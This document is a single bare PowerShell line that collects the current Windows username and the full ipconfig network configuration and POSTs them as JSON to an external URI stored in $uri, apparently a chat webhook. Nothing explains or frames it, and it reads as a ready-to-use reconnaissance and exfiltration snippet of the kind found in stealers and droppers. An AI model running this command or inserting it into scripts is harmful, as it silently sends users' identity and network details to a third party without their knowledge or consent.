Invoke-RestMethod -Uri $uri -Method Post -ContentType 'Application/Json'-Body (@{'username'=$env:USERNAME;'content'=(ipconfig | Out-String)} | ConvertTo-Json)
